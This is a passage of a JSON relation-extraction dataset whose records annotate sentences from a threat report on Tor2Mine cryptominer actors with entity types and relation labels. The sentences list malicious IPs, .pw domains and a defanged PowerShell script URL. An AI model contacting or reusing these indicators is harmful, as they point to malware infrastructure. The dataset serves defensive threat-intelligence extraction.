"evidence": [6, 7], "t": 22, "h": 26}, {"r": "ST", "evidence": [6, 7], "t": 23, "h": 26}, {"r": "RF", "evidence": [6, 7], "t": 23, "h": 26}, {"r": "ST", "evidence": [6, 7], "t": 24, "h": 26}, {"r": "RF", "evidence": [6, 7], "t": 24, "h": 26}, {"r": "EX", "evidence": [7], "h": 26, "t": 27}]}, {"title": "087-2", "sents": [["The", "res1.myrms.pw", "domain", "also", "appears", "to", "have", "connections", "to", "Tor2Mine", ",", "as", "it", "is", "hosted", "on", "an", "IP", "address", "(", "107.181.187.132", ")", "previously", "known", "to", "be", "used", "by", "Tor2Mine", "actors", "."], ["In", "the", "activity", "outlined", "in", "our", "2018", "blog", ",", "Tor2Mine", "actors", "used", "a", "PowerShell", "script", "to", "install", "follow-on", "malware", "onto", "the", "compromised", "system", "from", "this", "same", "IP", "."], ["The", "eu1.minerpool.pw", ",", "also", "hosted", "on", "107.181.187.132", ",", "is", "the", "same", "mining", "pool", "the", "actors", "used", "in", "the", "2018", "activity", "."], ["The", "actor", "also", "used", "a", "PowerShell", "command", "to", "download", "a", ".ps1", "file", "from", "hxxp", ":", "//v1.fym5gserobhh.pw/v1/check1.ps1", "."], ["The", "v1.fym5gserobhh.pw", "domain", "is", "hosted", "on", "the", "same", "aforementioned", "IP", "."], ["According", "to", "Umbrella", "data", ",", "v1.fym5gserobhh.pw", "and", "eu1.minerpool.pw", "are", "registered", "under", "two", "different", "reg.ru", "nameservers", "(", "ns2.reg.ru", "and", "ns1.reg.ru", ")", "."], ["In", "similar", "activity", "related", "to", "another", "company", "in", "mid-May", ",", "we", "saw", "the", "actors", "using", "Mshta", "to", "execute", "HTA", "files", "from", "many", "of", "the", "same", "URLs", "mentioned", "above", "."], ["The", "domain", "is", "hosted", "on", "the", "same", "107.181.187.132", "IP", "address", "and", "was", "first", "seen", "in", "March", "2020", ",", "according", "to", "Umbrella", ",", "suggesting", "this", "is", "a", "relatively", "new", "component", "of", "the", "attacker", "'", "s", "infrastructure", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [1, 1], "name": "res1.myrms.pw", "pos": [1, 2], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [9, 9], "name": "Tor2Mine", "pos": [9, 10], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [20, 20], "name": "107.181.187.132", "pos": [20, 21], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [40, 40], "name": "Tor2Mine", "pos": [9, 10], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [44, 44], "name": "PowerShell script", "pos": [13, 15], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [49, 49], "name": "malware", "pos": [18, 19], "index": "5_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [57, 57], "name": "IP", "pos": [26, 27], "index": "6_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [60, 60], "name": "eu1.minerpool.pw", "pos": [1, 2], "index": "7_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [65, 65], "name": "107.181.187.132", "pos": [6, 7], "index": "8_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [73, 73], "name": "actors", "pos": [14, 15], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [81, 81], "name": "actor", "pos": [1, 2], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [85, 85], "name": "PowerShell command", "pos": [5, 7], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [90, 90], "name": ".ps1", "pos": [10, 11], "index": "12_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [93, 93], "name": "hxxp : //v1.fym5gserobhh.pw/v1/check1.ps1", "pos": [13, 16], "index": "13_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [98, 98], "name": "v1.fym5gserobhh.pw", "pos": [1, 2], "index": "14_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [113, 113], "name": "v1.fym5gserobhh.pw", "pos": [5, 6], "index": "15_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [115, 115], "name": "eu1.minerpool.pw", "pos": [7, 8], "index": "16_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [122, 122], "name": "nameservers", "pos": [14, 15], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [142, 142], "name": "actors", "pos": [13, 14], "index": "18_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [144, 144], "name": "Mshta", "pos": [15, 16], "index": "19_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [147, 147], "name": "HTA files", "pos": [18, 20], "index": "20_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [159, 159], "name": "domain", "pos": [1, 2], "index": "21_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [165, 165], "name": "107.181.187.132", "pos": [7, 8], "index": "22_0"}]], "labels": [{"r": "ST", "evidence": [0], "t": 0, "h": 1}, {"r": "RF", "evidence": [0], "t": 0, "h": 1}, {"r": "CO", "evidence": [0], "h": 0, "t": 2}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 6}, {"r": "EX", "evidence": [1], "h": 3, "t": 4}, {"r": "FR", "evidence": [1], "h": 3, "t": 5}, {"r": "ST", "evidence": [1], "h": 5, "t": 6}, {"r": "RF", "evidence": [1], "h": 5, "t": 6}, {"r": "RD", "evidence": [1, 2], "t": 4, "h": 9}, {"r": "ST", "evidence": [2, 3], "h": 9, "t": 13}, {"r": "RF", "evidence": [2, 3], "h": 9, "t": 13}, {"r": "CO", "evidence": [2], "h": 7, "t": 8}, {"r": "EX", "evidence": [3], "h": 10, "t": 11}, {"r": "WR", "evidence": [3], "h": 10, "t": 12}, {"r": "ST", "evidence": [3], "h": 10, "t": 13}, {"r": "RF", "evidence": [3], "h": 10, "t": 13}, {"r": "ST", "evidence": [3, 4], "h": 10, "t": 14}, {"r": "RF", "evidence": [3, 4], "h": 10, "t": 14}, {"r": "ST", "evidence": [3, 4, 5], "h": 10, "t": 16}, {"r": "RF", "evidence": [3, 4, 5], "h": 10, "t": 16}, {"r": "ST", "evidence": [3, 4, 5], "h": 10, "t": 17}, {"r": "RF", "evidence": [3, 4, 5], "h": 10, "t": 17}, {"r": "CO", "evidence": [3, 4, 5, 6], "h": 10, "t": 18}, {"r": "CO", "evidence": [4, 5], "h": 14, "t": 15}, {"r": "FR", "evidence": [6], "h": 18, "t": 19}, {"r": "ST", "evidence": [5, 6], "t": 15, "h": 19}, {"r": "RF", "evidence": [5, 6], "t": 15, "h": 19}, {"r": "ST", "evidence": [5, 6], "t": 16, "h": 19}, {"r": "RF", "evidence": [5, 6], "t": 16, "h": 19}, {"r": "ST", "evidence": [5, 6], "t": 17, "h": 19}, {"r": "RF", "evidence": [5, 6], "t": 17, "h": 19}, {"r": "EX", "evidence": [6], "h": 19, "t": 20}, {"r": "CO", "evidence": [7], "h": 21, "t": 22}]}, {"title": "087-3", "sents": [["In", "the", "activity", "outlined", "in", "our", "2018", "blog", ",", "Tor2Mine", "actors", "used", "a", "PowerShell", "script", "to", "install", "follow-on", "malware", "onto", "the", "compromised", "system", "from", "this", "same", "IP", "."], ["The", "eu1.minerpool.pw", ",", "also", "hosted", "on", "107.181.187.132", ",", "is", "the", "same", "mining", "pool", "the", "actors", "used", "in", "the", "2018", "activity", "."], ["The", "actor", "also", "used", "a", "PowerShell", "command", "to", "download", "a", ".ps1", "file", "from", "hxxp", ":", "//v1.fym5gserobhh.pw/v1/check1.ps1", "."], ["The", "v1.fym5gserobhh.pw", "domain", "is", "hosted", "on", "the", "same", "aforementioned", "IP", "."], ["According", "to", "Umbrella", "data", ",", "v1.fym5gserobhh.pw", "and", "eu1.minerpool.pw", "are", "registered", "under", "two", "different", "reg.ru", "nameservers", "(", "ns2.reg.ru", "and", "ns1.reg.ru", ")", "."], ["In", "similar", "activity", "related", "to", "another", "company", "in", "mid-May", ",", "we", "saw", "the", "actors", "using", "Mshta", "to", "execute", "HTA", "files", "from", "many", "of", "the", "same", "URLs", "mentioned", "above", "."], ["The", "domain", "is", "hosted", "on", "the", "same", "107.181.187.132", "IP", "address", "and", "was", "first", "seen", "in", "March", "2020", ",", "according", "to", "Umbrella", ",", "suggesting", "this", "is", "a", "relatively", "new", "component", "of", "the", "attacker", "'", "s", "infrastructure", "."], ["We", "identified", "a", "new", "IP", ",", "185.10.68.147", ",", "hosting", "at", "least", "two", "domains", ",", "asq.r77vh0.pw", "and", "asq.d6shiiwz.pw", ",", "that", "we", "assess", "are", "part", "of", "Tor2Mine", "'", "s", "infrastructure", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [9, 9], "name": "Tor2Mine", "pos": [9, 10], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [13, 13], "name": "PowerShell script", "pos": [13, 15], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [18, 18], "name": "malware", "pos": [18, 19], "index": "2_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [26, 26], "name": "IP", "pos": [26, 27], "index": "3_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [29, 29], "name": "eu1.minerpool.pw", "pos": [1, 2], "index": "4_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [34, 34], "name": "107.181.187.132", "pos": [6, 7], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [42, 42], "name": "actors", "pos": [14, 15], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [50, 50], "name": "actor", "pos": [1, 2], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [54, 54], "name": "PowerShell command", "pos": [5, 7], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [59, 59], "name": ".ps1", "pos": [10, 11], "index": "9_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [62, 62], "name": "hxxp : //v1.fym5gserobhh.pw/v1/check1.ps1", "pos": [13, 16], "index": "10_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [67, 67], "name": "v1.fym5gserobhh.pw", "pos": [1, 2], "index": "11_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [82, 82], "name": "v1.fym5gserobhh.pw", "pos": [5, 6], "index": "12_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [84, 84], "name": "eu1.minerpool.pw", "pos": [7, 8], "index": "13_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [91, 91], "name": "nameservers", "pos": [14, 15], "index": "14_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [111, 111], "name": "actors", "pos": [13, 14], "index": "15_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [113, 113], "name": "Mshta", "pos": [15, 16], "index": "16_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [116, 116], "name": "HTA files", "pos": [18, 20], "index": "17_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [128, 128], "name": "domain", "pos": [1, 2], "index": "18_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [134, 134], "name": "107.181.187.132", "pos": [7, 8], "index": "19_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [169, 169], "name": "185.10.68.147", "pos": [6, 7], "index": "20_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [177, 177], "name": "asq.r77vh0.pw", "pos": [14, 15], "index": "21_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [179, 179], "name": "asq.d6shiiwz.pw", "pos": [16, 17], "index": "22_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [0], "h": 0, "t": 2}, {"r": "ST", "evidence": [0], "h": 2, "t": 3}, {"r": "RF", "evidence": [0], "h": 2, "t": 3}, {"r": "RD", "evidence": [0, 1], "t": 1, "h": 6}, {"r": "ST", "evidence": [1, 2], "h": 6, "t": 10}, {"r": "RF", "evidence": [1, 2], "h": 6, "t": 10}, {"r": "CO", "evidence": [1], "h": 4, "t": 5}, {"r": "EX", "evidence": [2], "h": 7, "t": 8}, {"r": "WR", "evidence": [2], "h": 7, "t": 9}, {"r": "ST", "evidence": [2], "h": 7, "t": 10}, {"r": "RF", "evidence": [2], "h": 7, "t": 10}, {"r": "ST", "evidence": [2, 3], "h": 7, "t": 11}, {"r": "RF", "evidence": [2, 3], "h": 7, "t": 11}, {"r": "ST", "evidence": [2, 3, 4], "h": 7, "t": 13}, {"r": "RF", "evidence": [2, 3, 4], "h": 7, "t": 13}, {"r": "ST", "evidence": [2, 3, 4], "h": 7, "t": 14}, {"r": "RF", "evidence": [2, 3, 4], "h": 7, "t": 14}, {"r": "CO", "evidence": [2, 3, 4, 5], "h": 7, "t": 15}, {"r": "CO", "evidence": [3, 4], "h": 11, "t": 12}, {"r": "FR", "evidence": [5], "h": 15, "t": 16}, {"r": "ST", "evidence": [4, 5], "t": 12, "h": 16}, {"r": "RF", "evidence": [4, 5], "t": 12, "h": 16}, {"r": "ST", "evidence": [4, 5], "t": 13, "h": 16}, {"r": "RF", "evidence": [4, 5], "t": 13, "h": 16}, {"r": "ST", "evidence": [4, 5], "t": 14, "h": 16}, {"r": "RF", "evidence": [4, 5], "t": 14, "h": 16}, {"r": "EX", "evidence": [5], "h": 16, "t": 17}, {"r": "CO", "evidence": [6], "h": 18, "t": 19}, {"r": "CO", "evidence": [7], "h": 20, "t": 21}, {"r": "CO", "evidence": [7], "h": 20, "t": 22}]}, {"title": "087-4", "sents": [["The", "eu1.minerpool.pw", ",", "also", "hosted", "on", "107.181.187.132", ",", "is", "the", "same", "mining", "pool", "the", "actors", "used", "in", "the", "2018", "activity", "."], ["The", "actor", "also", "used", "a", "PowerShell", "command", "to", "download", "a", ".ps1", "file", "from", "hxxp", ":", "//v1.fym5gserobhh.pw/v1/check1.ps1", "."], ["The", "v1.fym5gserobhh.pw", "domain", "is", "hosted", "on", "the", "same", "aforementioned", "IP", "."], ["According", "to", "Umbrella", "data", ",", "v1.fym5gserobhh.pw", "and", "eu1.minerpool.pw", "are", "registered", "under", "two", "different", "reg.ru", "nameservers", "(", "ns2.reg.ru", "and", "ns1.reg.ru", ")", "."], ["In", "similar", "activity", "related", "to", "another", "company", "in", "mid-May", ",", "we", "saw", "the", "actors", "using", "Mshta", "to", "execute", "HTA", "files", "from", "many", "of", "the", "same", "URLs", "mentioned", "above", "."], ["The", "domain", "is", "hosted", "on", "the", "same", "107.181.187.132", "IP", "address", "and", "was", "first", "seen", "in", "March", "2020", ",", "according", "to", "Umbrella", ",", "suggesting", "this", "is", "a", "relatively", "new", "component", "of", "the", "attacker", "'", "s", "infrastructure", "."], ["We", "identified", "a", "new", "IP", ",", "185.10.68.147", ",", "hosting", "at", "least", "two", "domains", ",", "asq.r77vh0.pw", "and", "asq.d6shiiwz.pw", ",", "that", "we", "assess", "are", "part", "of", "Tor2Mine", "'", "s", "infrastructure", "."], ["The", "asq.r77vh0.pw", "domain", "is", "registered", "under", "the", "same", "two", "previously", "mentioned", "reg.ru", "providers", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [1, 1], "name": "eu1.minerpool.pw", "pos": [1, 2], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [6, 6], "name": "107.181.187.132", "pos": [6, 7], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [14, 14], "name": "actors", "pos": [14, 15], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [22, 22], "name": "actor", "pos": [1, 2], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [26, 26], "name": "PowerShell command", "pos": [5, 7], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [31, 31], "name": ".ps1", "pos": [10, 11], "index": "5_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [34, 34], "name": "hxxp : //v1.fym5gserobhh.pw/v1/check1.ps1", "pos": [13, 16], "index": "6_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [39, 39], "name": "v1.fym5gserobhh.pw", "pos": [1, 2], "index": "7_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [54, 54], "name": "v1.fym5gserobhh.pw", "pos": [5, 6], "index": "8_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [56, 56], "name": "eu1.minerpool.pw", "pos": [7, 8], "index": "9_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [63, 63], "name": "nameservers", "pos": [14, 15], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [83, 83], "name": "actors", "pos": [13, 14], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [85, 85], "name": "Mshta", "pos": [15, 16], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [88, 88], "name": "HTA files", "pos": [18, 20], "index": "13_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [100, 100], "name": "domain", "pos": [1, 2], "index": "14_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [106, 106], "name": "107.181.187.132", "pos": [7, 8], "index": "15_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [141, 141], "name": "185.10.68.147", "pos": [6, 7], "index": "16_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [149, 149], "name": "asq.r77vh0.pw", "pos": [14, 15], "index": "17_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [151, 151], "name": "asq.d6shiiwz.pw", "pos": [16, 17], "index": "18_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [165, 165], "name": "asq.r77vh0.pw", "pos": [1, 2], "index": "19_0"}]], "labels": [{"r": "ST", "evidence": [0, 1], "h": 2, "t": 6}, {"r": "RF", "evidence": [0, 1], "h": 2, "t": 6}, {"r": "CO", "evidence": [0], "h": 0, "t": 1}, {"r": "EX", "evidence": [1], "h": 3, "t": 4}, {"r": "WR", "evidence": [1], "h": 3, "t": 5}, {"r": "ST", "evidence": [1], "h": 3, "t": 6}, {"r": "RF", "evidence": [1], "h": 3, "t": 6}, {"r": "ST", "evidence": [1, 2], "h": 3, "t": 7}, {"r": "RF", "evidence": [1, 2], "h": 3, "t": 7}, {"r": "ST", "evidence": [1, 2, 3], "h": 3, "t": 9}, {"r": "RF", "evidence": [1, 2, 3], "h": 3, "t": 9}, {"r": "ST", "evidence": [1, 2, 3], "h": 3, "t": 10}, {"r": "RF", "evidence": [1, 2, 3], "h": 3, "t": 10}, {"r": "CO", "evidence": [1, 2, 3, 4], "h": 3, "t": 11}, {"r": "CO", "evidence": [2, 3], "h": 7, "t": 8}, {"r": "FR", "evidence": [4], "h": 11, "t": 12}, {"r": "ST", "evidence": [3, 4], "t": 8, "h": 12}, {"r": "RF", "evidence": [3, 4], "t": 8, "h": 12}, {"r": "ST", "evidence": [3, 4], "t": 9, "h": 12}, {"r": "RF", "evidence": [3, 4], "t": 9, "h": 12}, {"r": "ST", "evidence": [3, 4], "t": 10, "h": 12}, {"r": "RF", "evidence": [3, 4], "t": 10, "h": 12}, {"r": "EX", "evidence": [4], "h": 12, "t": 13}, {"r": "ST", "evidence": [4, 5, 6, 7], "h": 12, "t": 19}, {"r": "RF", "evidence": [4, 5, 6, 7], "h": 12, "t": 19}, {"r": "CO", "evidence": [5], "h": 14, "t": 15}, {"r": "CO", "evidence": [6], "h": 16, "t": 17}, {"r": "CO", "evidence": [6], "h": 16, "t": 18}]}, {"title": "087-5", "sents": [["The", "actor", "also", "used", "a", "PowerShell", "command", "to", "download", "a", ".ps1", "file", "from", "hxxp", ":", "//v1.fym5gserobhh.pw/v1/check1.ps1", "."], ["The", "v1.fym5gserobhh.pw", "domain", "is", "hosted", "on", "the", "same", "aforementioned", "IP", "."], ["According", "to", "Umbrella", "data", ",", "v1.fym5gserobhh.pw", "and", "eu1.minerpool.pw", "are", "registered", "under", "two", "different", "reg.ru", "nameservers", "(", "ns2.reg.ru", "and", "ns1.reg.ru", ")", "."], ["In", "similar", "activity", "related", "to", "another", "company", "in", "mid-May", ",", "we", "saw", "the", "actors", "using", "Mshta", "to", "execute", "HTA", "files", "from", "many", "of", "the", "same", "URLs", "mentioned", "above", "."], ["The", "domain", "is", "hosted", "on", "the", "same", "107.181.187.132", "IP", "address", "and", "was", "first", "seen", "in", "March", "2020", ",", "according", "to", "Umbrella", ",", "suggesting", "this", "is", "a", "relatively", "new", "component", "of", "the", "attacker", "'", "s", "infrastructure", "."], ["We", "identified", "a", "new", "IP", ",", "185.10.68.147", ",", "hosting", "at", "least", "two", "domains", ",", "asq.r77vh0.pw", "and", "asq.d6shiiwz.pw", ",", "that", "we", "assess", "are", "part", "of", "Tor2Mine", "'", "s", "infrastructure", "."], ["The", "asq.r77vh0.pw", "domain", "is", "registered", "under", "the", "same", "two", "previously", "mentioned", "reg.ru", "providers", "."], ["The", "asq.r77vh0.pw", "domain", "also", "has", "at", "least", "one", "referring", "file", "(", "67f5f339c71c9c887dfece5cb6e2ab6", ")", "that", "reaches", "out", "to", "both", "the", "older", "107.181.160.197", "IP", "and", "the", "newly", "identified", "185.10.68.147", "IP", ",", "bolstering", "the", "notion", "that", "185.10.68.147", "is", "an", "extension", "of", "Tor2Mine", "'", "s", "infrastructure", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "actor", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [5, 5], "name": "PowerShell command", "pos": [5, 7], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [10, 10], "name": ".ps1", "pos": [10, 11], "index": "2_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [13, 13], "name": "hxxp : //v1.fym5gserobhh.pw/v1/check1.ps1", "pos": [13, 16], "index": "3_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [18, 18], "name": "v1.fym5gserobhh.pw", "pos": [1, 2], "index": "4_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [33, 33], "name": "v1.fym5gserobhh.pw", "pos": [5, 6], "index": "5_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [35, 35], "name": "eu1.minerpool.pw", "pos": [7, 8], "index": "6_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [42, 42], "name": "nameservers", "pos": [14, 15], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [62, 62], "name": "actors", "pos": [13, 14], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [64, 64], "name": "Mshta", "pos": [15, 16], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [67, 67], "name": "HTA files", "pos": [18, 20], "index": "10_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [79, 79], "name": "domain", "pos": [1, 2], "index": "11_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [85, 85], "name": "107.181.187.132", "pos": [7, 8], "index": "12_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [120, 120], "name": "185.10.68.147", "pos": [6, 7], "index": "13_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [128, 128], "name": "asq.r77vh0.pw", "pos": [14, 15], "index": "14_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [130, 130], "name": "asq.d6shiiwz.pw", "pos": [16, 17], "index": "15_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [144, 144], "name": "asq.r77vh0.pw", "pos": [1, 2], "index": "16_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [158, 158], "name": "asq.r77vh0.pw", "pos": [1, 2], "index": "17_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [177, 177], "name": "107.181.160.197", "pos": [20, 21], "index": "18_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [183, 183], "name": "185.10.68.147", "pos": [26, 27], "index": "19_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [190, 190], "name": "185.10.68.147", "pos": [33, 34], "index": "20_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "ST", "evidence": [0], "h": 0, "t": 3}, {"r": "RF", "evidence": [0], "h": 0, "t": 3}, {"r": "ST", "evidence": [0, 1], "h": 0, "t": 4}, {"r": "RF", "evidence": [0, 1], "h": 0, "t": 4}, {"r": "ST", "evidence": [0, 1, 2], "h": 0, "t": 6}, {"r": "RF", "evidence": [0, 1, 2], "h": 0, "t": 6}, {"r": "ST", "evidence": [0, 1, 2], "h": 0, "t": 7}, {"r": "RF", "evidence": [0, 1, 2], "h": 0, "t": 7}, {"r": "CO", "evidence": [0, 1, 2, 3], "h": 0, "t": 8}, {"r": "CO", "evidence": [1, 2], "h": 4, "t": 5}, {"r": "FR", "evidence": [3], "h": 8, "t": 9}, {"r": "ST", "evidence": [2, 3], "t": 5, "h": 9}, {"r": "RF", "evidence": [2, 3], "t": 5, "h": 9}, {"r": "ST", "evidence": [2, 3], "t": 6, "h": 9}, {"r": "RF", "evidence": [2, 3], "t": 6, "h": 9}, {"r": "ST", "evidence": [2, 3], "t": 7, "h": 9}, {"r": "RF", "evidence": [2, 3], "t": 7, "h": 9}, {"r": "EX", "evidence": [3], "h": 9, "t": 10}, {"r": "ST", "evidence": [3, 4, 5, 6], "h": 9, "t": 16}, {"r": "RF", "evidence": [3, 4, 5, 6], "h": 9, "t": 16}, {"r": "ST", "evidence": [3, 4, 5, 6, 7], "h": 9, "t": 18}, {"r": "RF", "evidence": [3, 4, 5, 6, 7], "h": 9, "t": 18}, {"r": "ST", "evidence": [3, 4, 5, 6, 7], "h": 9, "t": 19}, {"r": "RF", "evidence": [3, 4, 5, 6, 7], "h": 9, "t": 19}, {"r": "CO", "evidence": [4], "h": 11, "t": 12}, {"r": "CO", "evidence": [5], "h": 13, "t": 14}, {"r": "CO", "evidence": [5], "h": 13, "t": 15}, {"r": "CO", "evidence": [6, 7], "h": 16, "t": 17}, {"r": "CO", "evidence": [7], "h": 19, "t": 20}]}, {"title": "087-6", "sents": [["The", "v1.fym5gserobhh.pw", "domain", "is", "hosted", "on", "the", "same", "aforementioned", "IP", "."], ["According", "to", "Umbrella", "data", ",", "v1.fym5gserobhh.pw", "and", "eu1.minerpool.pw", "are", "registered", "under", "two", "different", "reg.ru", "nameservers", "(", "ns2.reg.ru", "and", "ns1.reg.ru", ")", "."], ["In", "similar", "activity", "related", "to", "another", "company", "in", "mid-May", ",", "we", "saw", "the", "actors", "using", "Mshta", "to", "execute", "HTA", "files", "from", "many", "of", "the", "same", "URLs", "mentioned", "above", "."], ["The", "domain", "is", "hosted", "on", "the", "same", "107.181.187.132", "IP", "address", "and", "was", "first", "seen", "in", "March", "2020", ",", "according", "to", "Umbrella", ",", "suggesting", "this", "is", "a", "relatively", "new", "component", "of", "the", "attacker", "'", "s", "infrastructure", "."], ["We", "identified", "a", "new", "IP", ",", "185.10.68.147", ",", "hosting", "at", "least", "two", "domains", ",", "asq.r77vh0.pw", "and", "asq.d6shiiwz.pw", ",", "that", "we", "assess", "are", "part", "of", "Tor2Mine", "'", "s", "infrastructure", "."], ["The", "asq.r77vh0.pw", "domain", "is", "registered", "under", "the", "same", "two", "previously", "mentioned", "reg.ru", "providers", "."], ["The", "asq.r77vh0.pw", "domain", "also", "has", "at", "least", "one", "referring", "file", "(", "67f5f339c71c9c887dfece5cb6e2ab6", ")", "that", "reaches", "out", "to", "both", "the", "older", "107.181.160.197", "IP", "and", "the", "newly", "identified", "185.10.68.147", "IP", ",", "bolstering", "the", "notion", "that", "185.10.68.147", "is", "an", "extension", "of", "Tor2Mine", "'", "s", "infrastructure", "."], ["Cisco", "Umbrella", "showing", "a", "spike", "in", "DNS", "requests", "for", "asq.r77vh0.pw", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [1, 1], "name": "v1.fym5gserobhh.pw", "pos": [1, 2], "index": "0_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [16, 16], "name": "v1.fym5gserobhh.pw", "pos": [5, 6], "index": "1_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [18, 18], "name": "eu1.minerpool.pw", "pos": [7, 8], "index": "2_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [25, 25], "name": "nameservers", "pos": [14, 15], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [45, 45], "name": "actors", "pos": [13, 14], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [47, 47], "name": "Mshta", "pos": [15, 16], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [50, 50], "name": "HTA files", "pos": [18, 20], "index": "6_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [62, 62], "name": "domain", "pos": [1, 2], "index": "7_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [68, 68], "name": "107.181.187.132", "pos": [7, 8], "index": "8_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [103, 103], "name": "185.10.68.147", "pos": [6, 7], "index": "9_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [111, 111], "name": "asq.r77vh0.pw", "pos": [14, 15], "index": "10_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [113, 113], "name": "asq.d6shiiwz.pw", "pos": [16, 17], "index": "11_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [127, 127], "name": "asq.r77vh0.pw", "pos": [1, 2], "index": "12_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [141, 141], "name": "asq.r77vh0.pw", "pos": [1, 2], "index": "13_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [160, 160], "name": "107.181.160.197", "pos": [20, 21], "index": "14_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [166, 166], "name": "185.10.68.147", "pos": [26, 27], "index": "15_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [173, 173], "name": "185.10.68.147", "pos": [33, 34], "index": "16_0"}], [{"type": "SO", "sent_id": 7, 